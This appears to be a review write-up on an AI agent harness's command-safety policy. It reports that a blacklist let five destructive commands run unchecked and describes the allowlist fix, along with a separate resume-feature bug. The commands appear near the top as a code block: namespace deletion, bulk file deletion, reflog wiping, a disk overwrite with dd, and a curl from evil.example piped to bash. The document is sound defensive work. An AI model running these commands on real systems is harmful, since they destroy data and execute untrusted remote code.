## fable-seat's P0: silence read as assent

It declared five destructive commands `ordinary`, named them as targets, and **every one ran to
`done`** — through all four layers — with `relaxations`, `on_trust` and `halt_reason` all empty.

```
kubectl delete namespace legacy      find /var/data -type f -delete
git reflog expire --expire=now --all dd if=/dev/zero of=/dev/sda
curl http://evil.example/i.sh | bash
```

Two mechanisms failed together:

1. **`policy._TARGET_RULES` is an enumerated blacklist**, and none of the five is on it. No list of
   dangerous commands is ever finished, so "no red-line pattern matched" carried no information —
   and was being read as *verified safe*. **This is KN-10 — the unrecognised case must be the
   stopping case — broken by the layer written to enforce KN-10.** I had called it "facts, not
   claims", and it does read facts; it just still had "proceed" as its default branch.

2. **`on_trust` fired only when no targets were named at all.** So naming any target — a benign
   `a.py` would do — switched the disclosure off. The safety net had a hole shaped exactly like the
   thing it was there to catch. That is KN-11 violated in its own words: *where a trust boundary
   cannot be removed, record it — not in silence.*

**And no test covered the path.** All 433 passed before and after I reproduced the bug.
`test_targets.py` only ever paired verifier sentences with targets the blacklist *already knew*, and
`test_an_operation_that_names_targets_is_not_recorded_as_trusted` pinned the hole as the requirement.
KN-8's shape: a test that feeds the mechanism what the mechanism can digest.

### The fix

A target now lands in one of **three** states — `red`, `ordinary`, `unrecognised` — via
`policy.recognise`, against a new `_ORDINARY_TARGETS` allowlist of everyday development commands and
paths. Unrecognised is not the safe one:

- it **stops the run** under `undeclared="refuse"` (the default), naming the target;
- under `allow` it proceeds and is **recorded** in `on_trust`, never silent;
- `on_trust` now means *nothing confirmed this* — no targets, **or** unrecognised ones.

Measured: all five silent passes stop; 20 everyday targets (`git commit`, `pytest`, `npm run build`,
a source path) are recognised, 0 false stops. `git push --force` and `git push -f` stay red while a
plain `git push` is ordinary — the red rules are consulted first, and the short-flag spelling was a
gap found while writing the test.

**This narrows how far the planner is trusted; it does not remove the planner as a trust boundary.**
What the allowlist has not seen still rests on the declaration. That is why the third state exists.

## codex-seat's P0: resume was documented, named in a test, and never built

The requirement: *在最糟的情況下也要能保留詢問的內容待下次恢復時再詢問.* Preserving worked.
**Re-asking on recovery did not exist.** `AskJournal.pending()` was only ever printed; a second run
restarted from `intake` and re-asked everything, overwriting the same files.

And `test_what_was_already_answered_is_not_re_asked` asserted that statuses had been *written* — not
that anything was skipped. **A test named for a behaviour nobody built, passing for four rounds of
review.** It was found by reading the caller, not the test.

Built: `AskJournal.answers()`, `RunConfig.resume`, `--resume`. A resumed run does not open a session
for work already answered, asks the pending question verbatim, and records what it reused.
`tests/test_resume.py` counts sessions rather than trusting a name. The old test keeps what it
actually checked, under an honest name.
